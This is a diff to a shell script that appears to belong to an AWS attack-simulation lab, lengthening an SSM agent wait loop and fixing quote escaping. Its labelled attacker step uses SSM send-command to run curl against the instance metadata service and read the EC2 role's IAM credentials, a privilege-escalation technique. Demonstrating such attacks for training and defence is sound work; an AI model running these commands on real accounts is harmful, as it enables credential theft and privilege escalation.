@@ -196,12 +196,14 @@ use_readonly_creds
 export AWS_REGION=$AWS_REGION
 echo "Verifying SSM agent is running on the instance..."
 
-MAX_RETRIES=5
+# Allow up to 3 minutes for the SSM agent to register — freshly-deployed instances
+# can take 1-2 minutes before the agent appears in DescribeInstanceInformation.
+MAX_RETRIES=18
 RETRY_COUNT=0
 SSM_READY=false
 
 while [ $RETRY_COUNT -lt $MAX_RETRIES ]; do
-    show_cmd "ReadOnly" "aws ssm describe-instance-information --region $AWS_REGION --filters "Key=InstanceIds,Values=$INSTANCE_ID" --query 'InstanceInformationList[0].PingStatus' --output text"
+    show_cmd "ReadOnly" "aws ssm describe-instance-information --region $AWS_REGION --filters \"Key=InstanceIds,Values=$INSTANCE_ID\" --query 'InstanceInformationList[0].PingStatus' --output text"
     SSM_STATUS=$(aws ssm describe-instance-information \
         --region $AWS_REGION \
         --filters "Key=InstanceIds,Values=$INSTANCE_ID" \
@@ -235,7 +237,7 @@ export AWS_REGION=$AWS_REGION
 echo "This is the privilege escalation vector..."
 echo "Executing command to retrieve credentials from instance metadata service"
 
-show_attack_cmd "Attacker" "aws ssm send-command --region $AWS_REGION --instance-ids "$INSTANCE_ID" --document-name "AWS-RunShellScript" --parameters 'commands=["TOKEN=\$(curl -X PUT \"http://169.254.169.254/latest/api/token\" -H \"X-aws-ec2-metadata-token-ttl-seconds: 21600\" 2>/dev/null)","curl -H \"X-aws-ec2-metadata-token: \$TOKEN\" http://169.254.169.254/latest/meta-data/iam/security-credentials/'"$EC2_ROLE_NAME"' 2>/dev/null"]' --query 'Command.CommandId' --output text"
+show_attack_cmd "Attacker" "aws ssm send-command --region $AWS_REGION --instance-ids \"$INSTANCE_ID\" --document-name \"AWS-RunShellScript\" --parameters 'commands=[\"TOKEN=\$(curl -X PUT \\\"http://169.254.169.254/latest/api/token\\\" -H \\\"X-aws-ec2-metadata-token-ttl-seconds: 21600\\\" 2>/dev/null)\",\"curl -H \\\"X-aws-ec2-metadata-token: \$TOKEN\\\" http://169.254.169.254/latest/meta-data/iam/security-credentials/$EC2_ROLE_NAME 2>/dev/null\"]' --query 'Command.CommandId' --output text"
 COMMAND_ID=$(aws ssm send-command \
     --region $AWS_REGION \
     --instance-ids "$INSTANCE_ID" \
